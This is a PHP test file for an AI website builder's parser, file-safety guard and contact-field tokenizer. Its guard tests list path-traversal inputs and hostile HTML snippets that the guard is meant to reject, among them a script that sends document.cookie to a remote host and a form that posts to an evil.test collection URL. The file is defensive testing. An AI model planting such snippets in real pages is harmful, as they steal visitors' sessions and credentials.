<?php

namespace Modules\AI\Tests\Feature;

use Modules\AI\Exceptions\AiSiteException;
use Modules\AI\Services\Sites\AiSiteFileGuard;
use Modules\AI\Services\Sites\AiSiteResponseParser;
use Modules\AI\Services\Sites\AiSiteTokenizer;
use Tests\TestCase;

/** Website builder: the pure pieces (parser, safety guard, contact tokenizer). */
class AiSiteEnginePartsTest extends TestCase
{
    private function reason(callable $fn): ?string
    {
        try {
            $fn();
        } catch (AiSiteException $e) {
            return $e->reason;
        }

        return null;
    }

    public function test_parser_reads_file_blocks_and_deletes_and_strips_fences(): void
    {
        $answer = "Sure!\n=== FILE: index.html ===\n<html></html>\n=== END FILE ===\n=== FILE: css/style.css ===\n```css\nbody{margin:0}\n```\n=== END FILE ===\n=== DELETE: old.js ===\n";

        $parsed = (new AiSiteResponseParser)->parse($answer);

        $this->assertSame(['index.html', 'css/style.css'], array_keys($parsed['files']));
        $this->assertSame("body{margin:0}\n", $parsed['files']['css/style.css']);
        $this->assertSame(['old.js'], $parsed['deletes']);
    }

    public function test_parser_refuses_a_truncated_or_empty_answer(): void
    {
        $parser = new AiSiteResponseParser;

        $this->assertSame('generation_truncated', $this->reason(fn () => $parser->parse("=== FILE: index.html ===\n<html>")));
        $this->assertSame('generation_empty', $this->reason(fn () => $parser->parse('I cannot do that.')));
    }

    public function test_guard_cleans_paths_and_rejects_bad_ones(): void
    {
        $guard = new AiSiteFileGuard;

        $this->assertSame('assets/app.js', $guard->cleanPath('assets/app.js'));
        $this->assertSame('file_path_invalid', $this->reason(fn () => $guard->cleanPath('/etc/index.html')));
        $this->assertSame('file_path_invalid', $this->reason(fn () => $guard->cleanPath('../secret.html')));
        $this->assertSame('file_path_invalid', $this->reason(fn () => $guard->cleanPath('a/b/c/d/e/f.html')));
        $this->assertSame('file_type_not_allowed', $this->reason(fn () => $guard->cleanPath('shell.php')));
        $this->assertSame('file_type_not_allowed', $this->reason(fn () => $guard->cleanPath('logo.svg')));
    }

    public function test_guard_requires_index_and_blocks_unsafe_content(): void
    {
        $guard = new AiSiteFileGuard;
        $ok = '<!doctype html><html><body><h1>Hi</h1></body></html>';

        $this->assertNull($this->reason(fn () => $guard->assertValid(['index.html' => $ok])));
        $this->assertSame('generation_no_index', $this->reason(fn () => $guard->assertValid(['about.html' => $ok])));

        foreach ([
            '<input type="password" name="p">',
            '<form action="https://evil.test/collect"><input name="a"></form>',
            '<meta http-equiv="refresh" content="0;url=https://evil.test">',
            '<script>fetch("x?c="+document.cookie)</script>',
            '<iframe src="https://evil.test/x"></iframe>',
        ] as $bad) {
            $this->assertSame('unsafe_content', $this->reason(fn () => $guard->assertValid(['index.html' => $ok.$bad])), $bad);
        }

        $this->assertNull($this->reason(fn () => $guard->assertValid(['index.html' => $ok.'<form action="#"><input name="a"></form>'])));
    }

    public function test_guard_enforces_size_limits(): void
    {
        config(['ai.sites.max_file_bytes' => 100]);

        $this->assertSame('generation_too_large', $this->reason(fn () => (new AiSiteFileGuard)->assertValid(['index.html' => str_repeat('a', 500)])));
    }

    public function test_tokenizer_fills_only_what_was_given_and_escapes_it(): void
    {
        $tokenizer = new AiSiteTokenizer;
        $map = $tokenizer->map([
            'contact' => ['phone' => '+20 100 123', 'whatsapp' => '+20 (100) 456', 'address' => 'Tom & "Jerry" St'],
            'social' => ['instagram' => 'https://instagram.com/acme'],
        ]);

        $out = $tokenizer->apply('{{PHONE}}|{{WHATSAPP_DIGITS}}|{{ADDRESS}}|{{INSTAGRAM_URL}}|{{EMAIL}}', $map);

        $this->assertSame('+20 100 123|20100456|Tom &amp; &quot;Jerry&quot; St|https://instagram.com/acme|{{EMAIL}}', $out);
    }
}
